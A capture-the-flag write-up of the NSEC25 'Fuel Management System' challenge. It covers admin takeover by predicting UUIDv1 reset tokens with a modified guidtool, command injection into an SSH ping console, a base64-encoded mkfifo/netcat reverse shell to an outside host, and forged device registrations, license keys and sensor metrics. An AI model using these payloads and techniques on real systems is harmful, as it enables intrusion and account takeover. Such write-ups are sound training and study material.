# Fuel Management System

During the [NSEC25 CTF](https://nsec.io/competition/) I had the opportunity to solve the following challenge with the help of my colleague [Ashiahanim Ayassor](https://www.linkedin.com/in/ash-ay/). I will detail all the steps of this challenge in this blog post.

## Intro

The following information was given during the CTF:

![Initial post of the challenge](./res/nsec25/message-initial.png)

In summary we got this information:

* URL: <https://dashboard.fms.ctf/account/change-password?token=14e355e1-f216-11ef-b19a-d0c637f44704>
* User account: `demo@fms.ctf`

## Recon

Using the URL, we arrived on this web page asking us for a password:

![First page](./res/nsec25/url-fournie.png)

We choose to set up the password as `test`:

![Password reset](./res/nsec25/set-password.png)

And then we tried to authenticate with the `demo` user which was given previously and its new password `test`:

![Authenticate with the demo user](./res/nsec25/auth-user-demo.png)

Once authenticated, we had access to this initial dashboard:

![The dashboard](./res/nsec25/dashboard.png)

The devices tab gave us this information, where one device seems to be activated and the other is not:

![The devices](./res/nsec25/devices.png)

If you try to activate it, you got an error. So for now we are not able to active it.

There is also a licenses tab, where only one license is valid and two are expired:

![The licenses](./res/nsec25/licenses.png)

The users tab informed us that there are only two accounts, and both of them are enabled:

![The users](./res/nsec25/users.png)

And finally the documentation tab, where we found some information regarding the sensor:

![Documentation](./res/nsec25/documentation.png)

We also found our first flag at the bottom of the page:

```powershell
$ /snap/bin/askgod submit FLAG-ca16cce6ad9a7f5eac1f6c949f34f86e66fbcc07                        
Congratulations, you score your team 1 points!
Message: Sometimes, you need to RTFM 1/6
```

We got a first hint on the CTF board:

![First hint](./res/nsec25/first-hint.png)

## Exploitation

### Infinite holes of rabbit

We took every possible rabbit holes on this track. Multiple reasons fort that:

* We were tired
* There was (too) many possibilities
* We suck at CTF

#### #1

So the first hint told us that the documentation is not complete. Since there is a *Documentation* tab, we focused on `this` specific documentation.

This documentation contains a URL for the API Swagger:

![API Swagger](./res/nsec25/fast-api.png)

This API contains multiple endpoints. We tried to perform some actions using it:

* `/api/register`

This endpoint is taking the following parameters:

```json
{
  "device_id": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "serial": "AAAA-BBBB-YYYY",
  "machine_id": "99999999999999999999999999999999",
  "ip": "<ipv6-welcome-to-nsec>",
  "mac": "<mac-address>"
}
```

After some try and reading the `Devices` tab, we understood that:

* `ip` is an arbitrary The IP(v6), let's say `9999:9999:9999:9999:9999:9999:9999:9999`
* `mac` is an arbitrary MAC address, let's say `00:18:55:aa:bb:cc`
* `machine_id` *seems* to be an arbitrary ID by sensor
* `serial` is structured using
  * The type of sensor, here it's `E4`
  * The MAC address
  * A checksum based on the 2 first elements, since it's between `001` and `999` most of the time, it can be brute-forced
* `device_id` is a checksum based on the `serial`

Regarding the size of the `device_id` we were not going to brute force it. We moved on.

* `/api/licenses`

We had not been able to add a new license. Every modification of the license key leads us to an error. Administrator rights are required.

* `/api/auth/reset`

We were able to reset the password of the `admin` account, but since we did not have access to its email it was useless.

* `/api/metrics`

Administrator rights are required. We (also) moved on.

#### #2

Maybe the *Documentation* quoted by the first hint was speaking about the documentation of FastAPI. Maybe some calls were undocumented on the swagger.

So we took a deep dive on the FastAPI, searching for some black magic API call. But we found nothing.

![FastAPI documentation](./res/nsec25/fastapi.png)

#### #3

Then we thought that there was maybe a CVE on FastAPI related to the `X-Token` that we saw on some requests. Once again, we were wrong.

#### #4

If you go back to the hint, it's talking about the administrator and the fact that only an administrator can do things. So maybe we just need to be administrator after all.

However there is no way to become administrator when we reset the password we just got this answer:

```json
{"detail":"ok","timestamp":"2025-05-17T04:17:29.166084+00:00"}
```

There are two ways to reset the password:

* Getting access to the administrator email address
* Finding the token generated when we performed the password reset

Since there is no way, based on our understanding, to get access to the email address we have to dig on the token.

The token for the `demo` account was `14e355e1-f216-11ef-b19a-d0c637f44704`. Based on our limited knowledge, it is definitely a `UUID` which stands for `Universally Unique Identifier`.

Using the web site <https://www.uuidtools.com/decode> we found that this `UUID` is a version 1 `UUID`:

![UUID decoder](./res/nsec25/uuid-decoder.png)

If you have a look at the screenshot, you can see that the last part of the UUID is a MAC address without the `:`.

Wikipedia gave us a little bit more details regarding UUID v1:

> Version 1 concatenates the 48-bit MAC address of the "node" (that is, the computer generating the UUID), with a 60-bit timestamp, being the number of 100-nanosecond intervals since midnight 15 October 1582 Coordinated Universal Time (UTC).

So, if we have the MAC address and the timestamp we should be able to brute force it. What a great idea. Let's do this.

We found [`guidtool`](https://github.com/intruder-io/guidtool) which is described as *A tool to inspect and attack version 1 GUIDs*:

![guidtool](./res/nsec25/guidtool.png)

The usage is pretty simple, you just have to give a timestamp and a sample UUID and the tool is giving you a list of potential UUID:

```powershell
$ guidtool -t '2025-05-16 23:00:00' 14e355e1-f216-11ef-b19a-d0c637f44704 | head
d7e4bc00-32d5-11f0-b19a-d0c637f44704
d7e4e310-32d5-11f0-b19a-d0c637f44704
[...]
d7e5cd70-32d5-11f0-b19a-d0c637f44704
d7e5f480-32d5-11f0-b19a-d0c637f44704
```

Then we used the Intrudor tab of Burp to brute force the good UUID. Sadly, it did not work at all. We tried using multiple timestamp, but we were unable to get the right UUID.

Let's think.

* This is the timestamp that the server sent us when we reset the password: `YYYY-MM-DDTHH:MM:SS.MS`
* This is the timestamp that guidtool is taking as input: `YYYY-MM-DD HH:NN:SS`

Looks like we are missing something here. We need to be more accurate. We should have read the initial message to the end:

![TIME](./res/nsec25/time.png)

### UUID is the answer

The tool does not give us the ability to specify the milliseconds so we have to update it. For now, it generates a lot of UUID with a variation of at least 1 second.

Pretty much all the source code is in the `guidtool.py`, and everything we are interested in is definitely in this file.

First, we have to update the `main` function since the `parser` does not allow us to use a timestamp with millisecond:

```python
def main():
[...]
    parser.add_argument("-t", "--base-time",
                        help="The estimated time at which the UUID was generated in '%%Y-%%m-%%d %%H:%%M:%%S' format, e.g. '2021-03-17 16:42:11'",
                        # HERE: "%Y-%m-%d %H:%M:%S
                        type=lambda s: datetime.datetime.strptime(s, "%Y-%m-%d %H:%M:%S"))
```

Then, we have to make two modifications on the `genUUIDs` function:

1. The `start` and `end` variable are calculated using a variation of 1 second. We need to remove it to be more accurate.
2. Then we can remove the `for` and replace the `t` parameter of the `uuid1` function call by `start` or `end`:

```python
def genUUIDs(sample_uuid, precision, seconds, base_time):
[...]
    dt_zero = datetime.datetime(1582, 10, 15)
    base_guid_time = base_time - dt_zero
    base_timestamp = int(base_guid_time.total_seconds() * 1e7)

    # HERE: (1e7)*seconds
    start =  int(base_timestamp - (1e7)*seconds)
    # HERE: (1e7)*seconds
    end =  int(base_timestamp + (1e7)*seconds)
    for t in range(start, end, precision):
        yield uuid1(u.node, u.clock_seq, t)
```

The final code is below:

```python
#! /usr/bin/env python3
import uuid
import datetime
import sys
import argparse

def UUIDTime(u):
    dt_zero = datetime.datetime(1582, 10, 15)
    return dt_zero + datetime.timedelta(microseconds=u.time//10)

def UUIDMac(u):
    return ":".join(['{:02x}'.format((u.node >> ele) & 0xff) for ele in range (0, 8*6,8)][::-1])

def uuid1(node, clock_seq, timestamp):

    time_low = timestamp & 0xffffffff
    time_mid = (timestamp >> 32) & 0xffff
    time_hi_version = (timestamp >> 48) & 0x0fff
    clock_seq_low = clock_seq & 0xff
    clock_seq_hi_variant = (clock_seq >> 8) & 0x3f
    return uuid.UUID(fields=(time_low, time_mid, time_hi_version, clock_seq_hi_variant, clock_seq_low, node), version=1)

def printUUIDInfo(u):
    try:
        u = uuid.UUID(u)
    except ValueError:
        print("Invalid UUID")
        sys.exit(2)

    print ("UUID version: {}".format(u.version))

    if u.version == 1:
        t = UUIDTime(u)
        print("UUID time: {}".format(t))
        print("UUID timestamp: {}".format(u.time))
        print("UUID node: {}".format(u.node))
        m = UUIDMac(u)
        print("UUID MAC address: {}".format(m))
        print("UUID clock sequence: {}".format(u.clock_seq))

def genUUIDs(sample_uuid, precision, seconds, base_time):
    u = uuid.UUID(sample_uuid)
    if u.version != 1:
        print("Only v1 GUIDs supported")
        sys.exit(2)

    # Get timestamp of starting GUID
    dt_zero = datetime.datetime(1582, 10, 15)
    base_guid_time = base_time - dt_zero
    base_timestamp = int(base_guid_time.total_seconds() * 1e7)

    # 1 second = 1e7 100-nanosecond intervals
    # NSEC25 - Update here
    end =  int(base_timestamp)
    start =  int(base_timestamp)
    # NSEC25 - Update here
    yield uuid1(u.node, u.clock_seq, start)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--info", help="Print UUID info an exit", action="store_true")

    parser.add_argument("-p", "--precision", type=int, default=10000, help="The number of 100-nanosecond intervals between each UUID (default 10000)")
    parser.add_argument("-r", "--range", type=int, default=1, help="The number of seconds each side of the timestamp to generate UUIDs for (deafult 1)")
    # NSEC25 - Update here
    parser.add_argument("-t", "--base-time",
                        help="The estimated time at which the UUID was generated in '%%Y-%%m-%%d %%H:%%M:%%S' format, e.g. '2021-03-17 16:42:11'",
                        type=lambda s: datetime.datetime.strptime(s, "%Y-%m-%d %H:%M:%S.%f"))

    parser.add_argument("uuid", help="The UUID to inspect")
    args = parser.parse_args()

    # Validate GUID
    try:
        _ = uuid.UUID(args.uuid)
    except:
        print("Invalid UUID")
        sys.exit(1)

    # Handle info printing
    if args.info:
        printUUIDInfo(args.uuid)
        sys.exit(0)

    # Handle generation. Some optional arguments are required in this case
    if args.base_time is None:
        print("Base time required - specify with '-t' or '--base-time'")
        sys.exit(1)

    for u in genUUIDs(args.uuid, args.precision, args.range, args.base_time):
        print(u)

    if name == "main":
    main()
```

After that, you can just rebuild the new version of the tool and ask the API to generate a new password for the `admin` user:

```powershell
POST /api/auth/token HTTP/1.1
Host: dashboard.fms.ctf
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkZW1vQGZtcy5jdGYiLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTc0NzQ0NzQxMX0.Kg9WhHqDVcx3H7Xy5K7-fz-RDxjg78cd1Wl4CyoRf6U
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: https://dashboard.fms.ctf
Referer: https://dashboard.fms.ctf/docs
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"email":"admin@fms.ctf"}
```

Grab the value of the `timestamp` field in the response:

```powershell
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 17 May 2025 04:17:29 GMT
Content-Type: application/json
Content-Length: 62
Connection: keep-alive

{"detail":"ok","timestamp":"2025-05-17T04:17:29.166084+00:00"}
```

Then, you can use your brand new version of `guidtool` with the timestamp and the initial UUID given in the initial message:

```powershell
$ guidtool -t '2025-05-17 14:32:45.201323' 14e355e1-f216-11ef-b19a-d0c637f44704
cc429cb0-332b-11f0-b19a-d0c637f44704
```

The new version of the tool will generate only one splendid UUID that you can use to authenticate as `admin`. The URL should look like this:

* <https://dashboard.fms.ctf/account/change-password?token=cc429cb0-332b-11f0-b19a-d0c637f44704>

You can set up the password of the `admin` account and authenticate as the administrator.

Let's grab a flag and read the next hint:

![Second hint](./res/nsec25/second-hint.png)

### RCE on the sensor

So, there is a diagnostic console on the sensor. We have the IP(v6) address of the sensors and there is only one sensor enabled. So let's scan this one:

```powershell
Nmap scan report for 9000:d37e:c40b:d1b5:218:55ff:fe94:ec1a
Host is up, received echo-reply ttl 59 (0.027s latency).
Scanned at 2025-05-17 17:12:54 CEST for 14s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 59 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The documentation of the FMS web site gave us the credentials (`app:sensor`), so we can just SSH on it:

```powershell
$ ssh app@9000:d37e:c40b:d1b5:218:55ff:fe94:ec1a                     
app@9000:d37e:c40b:d1b5:218:55ff:fe94:ec1a's password: 
```

After few seconds of loading this beautiful user interface should appear:

![Beautiful user interface](./res/nsec25/ssh-panel.png)

Juste hit `c` and you got some kind of shell allowing you to make a `ping`:

![The ping connection](./res/nsec25/ssh-connectivity-test.png)

Obviously, there is a command injection on it. After some try you will discover that, at least, `;` and `&` are filtered. So we have to use `|` for example

![RCE usage](./res/nsec25/rce-id.png)

And we got an RCE as the `app` user:

![RCE result](./res/nsec25/rce-id-result.png)

As a bonus, you can see your own request on the log:

![Bonus](./res/nsec25/log-rce.png)

Now that we have a RCE, we want to have a reverse shell, so let's make one. We choose to encode it with `base64` since there is some filtering.

* The initial reverse shell : `rm /tmp/ff; mkfifo /tmp/ff;cat /tmp/ff | /bin/sh -i 2>&1 | nc 9000:6666:6666:6666:216:3eff:feb1:8d80 8089 > /tmp/ff`
* The encoded reverse shell : `cm0gL3RtcC9mZjsgbWtmaWZvIC90bXAvZmY7Y2F0IC90bXAvZmYgfCAvYmluL3NoIC1pIDI+JjEgfCBuYyA5MDAwOjY2NjY6NjY2Njo2NjY2OjIxNjozZWZmOmZlYjE6OGQ4MCA4MDg5ID4gL3RtcC9mZg==`
* The final command to run on the ping shell : `9000:d37e:c40b:d1b5:218:55ff:fe94:ec1a | echo -n cm0gL3RtcC9mZjsgbWtmaWZvIC90bXAvZmY7Y2F0IC90bXAvZmYgfCAvYmluL3NoIC1pIDI+JjEgfCBuYyA5MDAwOjY2NjY6NjY2Njo2NjY2OjIxNjozZWZmOmZlYjE6OGQ4MCA4MDg5ID4gL3RtcC9mZg== | base64 -d -w 0 | sh`

After some recognition we have been able to find the next flag on the `/` folder:

```powershell
$ ls -la
total 31                                               
drwxr-xr-x  20 root   root     25 May 15 20:43 .           
drwxr-xr-x  20 root   root     25 May 15 20:43 ..
lrwxrwxrwx   1 root   root      7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x   2 root   root      2 Feb 26  2024 bin.usr-is-merged
drwxr-xr-x   2 root   root      2 Apr 22  2024 boot
drwxr-xr-x   8 root   root    480 May 16 13:31 dev
drwxr-xr-x  73 root   root    151 May 15 20:43 etc
-rw-r--r--   1 root   root     46 May 15 20:43 flag
#
$ cat flag
FLAG-986ded23879c8f9173492f4257d3460ddea5b878
```

One point, awesome:

```powershell
$ /snap/bin/askgod submit FLAG-986ded23879c8f9173492f4257d3460ddea5b878
Congratulations, you score your team 1 points!
Message: Destination Reached, look around for your next treasure 3/6
```

What about the third hint:

![](./res/nsec25/third-hint.png)

### I want a new device

The RCE allows to get the following information:

* Our current folder is `/home/app/sensor`
* It contains the following folders and files

```bash
init.sh
pyproject.toml
src
  console
  console.egg-info
uv.lock
```

The `src` folder contains the source code of the back end in multiple `py` files. The `client.py` for example

```python
[...]

class DeviceConfiguration(BaseModel):
    model: str
    interface: str

    @computed_field(return_type=str)
    @property
    def mac(self):
        return netifaces.ifaddresses(self.interface)[netifaces.AF_LINK][0]["addr"]

    @computed_field(return_type=str)
    @property
    def ip(self):
        return netifaces.ifaddresses(self.interface)[netifaces.AF_INET6][0]["addr"]

    @computed_field(return_type=str)
    @property
    def machine_id(self):
        return Path("/etc/machine-id").read_text().strip()

    @computed_field(return_type=str)
    @property
    def device_id(self):
        hmac_obj = HMAC.new(self.mac.replace(":", "").encode(), digestmod=SHA256)
        hmac_obj.update(self.machine_id.encode())
        return hmac_obj.hexdigest()

    @computed_field(return_type=str)
    @property
    def serial(self):
        mac = self.mac[8:].replace(":", "")
        base_serial = f"{self.model}{mac[0:2]}-{mac[2:6]}"
        checksum = int(base_serial[0:4], 16) - int(base_serial[5:9], 16)
        if checksum < 0:
            checksum = checksum * -1
        return f"{base_serial}-{checksum}".lower()

[...]

@http_wrap(error_value=False)
def register_device(device: DeviceConfiguration) -> bool:
    conf = device.model_dump(mode="json", exclude={"model", "interface"})
    response = requests.post(
        f"{BASE_URL}/register/",
        json=conf,
        verify=False,
        allow_redirects=False,
    )
    if response.status_code == 201:
        logger.info("Device registered successfully")
        return True
    else:
        logger.error(
            f"Device registration failed: {response.status_code} - {response.text}"
        )
        return False

[...]
```

The `register_device` function is giving us all the details we need to craft a `POST` request to register our own device.

Let's take some part of the code to create our own proof-of-concept. The idea of the PoC is to generate the right values for our new device:

* The `machine_id` value is read from a file on the sensor. Since we do not have a *real* sensor, we just put a random value. The value just needs to respect the specifications.
* The `mac_addr` value is the MAC address of the sensor. Again we do not have a *real* sensor, so we just put a random MAC address.

We are just using the code of the original `py` file to generate the `device_id` and the `serial` fields:

```python
from Crypto.Hash import HMAC, SHA256

machine_id = "99999999999999999999999999999999"
mac_addr = "00:18:55:ea:62:10"

# device_id

hmac_obj = HMAC.new(mac_addr.replace(":", "").encode(), digestmod=SHA256)
hmac_obj.update(machine_id.encode())

# serial

mac = mac_addr[8:].replace(":", "")
base_serial = f"e4{mac[0:2]}-{mac[2:6]}"
checksum = int(base_serial[0:4], 16) - int(base_serial[5:9], 16)
if checksum < 0:
    checksum = checksum * -1

print(hmac_obj.hexdigest())
print(checksum)
```

We ran the PoC:

```powershell
$ python3 poc.py 
59650d62169c4a187f047c084286c3c3f9ba39b71e99b43ca7bbea7cd7c07b51
33498
```

We reused those values for the `POST` request:

```powershell
POST /api/register/ HTTP/1.1
Host: dashboard.fms.ctf
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBmbXMuY3RmIiwiYWRtaW4iOnRydWUsImV4cCI6MTc0NzQ5Njk2NH0.aIW3WIKuG2rhPmCWx2T7E2v58R8m4T2wvTuyT-bUwDw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 235

{
  "device_id": "59650d62169c4a187f047c084286c3c3f9ba39b71e99b43ca7bbea7cd7c07b51",
  "serial": "e4ea-6210-33498",
  "machine_id": "99999999999999999999999999999999",
  "ip": "fe80::a471:c9ff:feea:6210",
  "mac": "00:18:55:ea:62:10"
}
```

It worked:

```powershell
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 17 May 2025 17:46:26 GMT
Content-Type: application/json
Content-Length: 315
Connection: keep-alive

{
    "ip":"fe80::a471:c9ff:feea:6210",
    "serial":"e4ea-6210-33498",
    "machine_id":"99999999999999999999999999999999",
    "last_seen":"2025-05-16T13:31:05.016958",
    "device_id":"59650d62169c4a187f047c084286c3c3f9ba39b71e99b43ca7bbea7cd7c07b51",
    "mac":"00:18:55:ea:62:10",
    "first_seen":"2025-05-16T13:31:05.016888",
    "activated":false
}
```

We found a new device, and a new flag on the user interface:

![New device registered](./res/nsec25/new-device.png)

Let's send the flag:

```powershell
$ /snap/bin/askgod submit FLAG-2e852a0da786c246475ad34e8ac348c167675be0
Congratulations, you score your team 2 points!
Message: New sensor detected 4/6
```

And grab the next hint:

![Fourth hint](./res/nsec25/fourth-hint.png)

### Where is my license

Now that we have a new sensor, we need to add a license on it to be able to enable it.

After trying some value on the license, we got the following errors:

| Value                              | Error                                                                      |
| ---------------------------------- | -------------------------------------------------------------------------- |
| `V`                                | `Value error, non-hexadecimal number found in fromhex() arg at position 0` |
| `AAAA`                             | `Value error, Data must be aligned to block boundary in ECB mode`          |
| `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` | `Data not padded`                                                          |

We learned that:

* It is only hexadecimal
* The `ECB` mode is used
* The data is padded

The request used to create a license key is the following:

```json
{
  "tenant_id":"b66a84fc-d6b7-455f-a010-c558adc6d4a8",
  "license_key":"bd04fe25c7eb9bbfd33e8[...]c56ddf59a730e167210552aaf31d31cb1517a8d92ef17"
}
```

So we can assume that the `tenant_id` is used to encrypt and decrypt the `license_key`.

After some failures, we are able to decrypt one of the license key with [`CyberChef`](https://gchq.github.io/CyberChef/):

![CyberChef is your friend](./res/nsec25/dechiffrement-cle-license.png)

Since we are able to decrypt, we should be able to encrypt the data. However for a long time, we were not able to get a proper license key using a decent `JSON` snippet.

We found that adding 10 spaces at our decent `JSON` snippet is making it decent enough to match a valid license key format:

![CyberChef is still your friend](./res/nsec25/chiffrement-cle-license.png)

Let's add our new license:

![The new license](./res/nsec25/new-license.png)

It appear on the user interface with a new flag:

![License added](./res/nsec25/ajout-cle-license.png)

The hint:

![Fifth hint](./res/nsec25/fifth-hint.png)

### KPI KPI KPI

Our understanding was that we have to put the metrics of `fuel` and `consumption` at zero for both of the sensors:

![The dashboard](./res/nsec25/dashboard.png)

Let's have a look on the `update_fuel_consumption` function:

```python
@http_wrap(error_value=True)
def update_fuel_consumption(consumption: int, device: DeviceConfiguration):
    payload = {
        "device_id": device.device_id,
        "sensor_id": 1,
        "sensor_data": hex(consumption),
        "sensor_type": "consumption",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    requests.post(
        f"{BASE_URL}/metrics/",
        json=payload,
        headers={"Content-Type": "application/json", "X-Token": str(uuid.uuid1())},
        verify=False,
    )
    logger.info(f"Fuel consumption - updated to {consumption}")
```

So we just need to generate two values:

* `timestamp` : We can just reuse the code used in the function
* `X-Token` : We can generate it directory on the sensor since we have a RCE on it. We can also use the tool we modified for the second flag.

Let's start by the sensor number one.

We choose to generate the `UUID` using the reverse shell:

```python
$ python -c "import uuid; print(str(uuid.uuid1()))"
6e15c755-38e4-11f0-8d8b-00185594ec1a
```

And we can generate the `timestamp` on our own computer using this one-liner:

```python
$ python3 -c "from datetime import datetime, timezone; print(datetime.now(timezone.utc).isoformat())"
2025-05-24T21:15:44.035058+00:00
```

We can now make the `POST` request on the `/api/metrics/` API endpoint for the `level`:

```json
POST /api/metrics/ HTTP/1.1
Host: dashboard.fms.ctf
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBmbXMuY3RmIiwiYWRtaW4iOnRydWUsImV4cCI6MTc0NzUyMjM2Mn0.pF-QSVrCqhbsTTEpPTHgrLZXRETRt095pPlGaLuHxWc
X-Token: 6e15c755-38e4-11f0-8d8b-00185594ec1a
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json
Content-Type: application/json
Content-Length: 215

{
  "device_id": "c58538930763e67e57f4bc48adf94261659b0cb0375aa11665db12b19371a095",
  "sensor_id": 1,
  "sensor_type": "level",
  "sensor_data": "0x0000",
  "timestamp": "2025-05-24T21:15:44.035058+00:00"
}
```

It worked:

```json
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 24 May 2025 21:17:35 GMT
Content-Type: application/json
Content-Length: 190
Connection: keep-alive

{
    "sensor_data":"0x0000",
    "device_id":"c58538930763e67e57f4bc48adf94261659b0cb0375aa11665db12b19371a095",
    "id":1099,
    "timestamp":"2025-05-24T21:15:44.035058",
    "sensor_id":1,
    "sensor_type":"level"
}
```

Let's do the same for the `consumption`:

```json
POST /api/metrics/ HTTP/1.1
Host: dashboard.fms.ctf
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBmbXMuY3RmIiwiYWRtaW4iOnRydWUsImV4cCI6MTc0NzUyMjM2Mn0.pF-QSVrCqhbsTTEpPTHgrLZXRETRt095pPlGaLuHxWc
X-Token: 6e15c755-38e4-11f0-8d8b-00185594ec1a
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json
Content-Type: application/json
Content-Length: 221

{
  "device_id": "c58538930763e67e57f4bc48adf94261659b0cb0375aa11665db12b19371a095",
  "sensor_id": 1,
  "sensor_type": "consumption",
  "sensor_data": "0x0000",
  "timestamp": "2025-05-24T21:15:44.035058+00:00"
}
```

It worked too:

```json
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 24 May 2025 21:17:28 GMT
Content-Type: application/json
Content-Length: 196
Connection: keep-alive

{"sensor_data":"0x0000","device_id":"c58538930763e67e57f4bc48adf94261659b0cb0375aa11665db12b19371a095","id":1098,"timestamp":"2025-05-24T21:15:44.035058","sensor_id":1,"sensor_type":"consumption"}
```

We did pretty much the same things for the second sensor. And we ot this at the end:

![Level zero](./res/nsec25/level-0.png)

Final hint:

![Last hint](./res/nsec25/last-hint.png)

Mission accomplished.
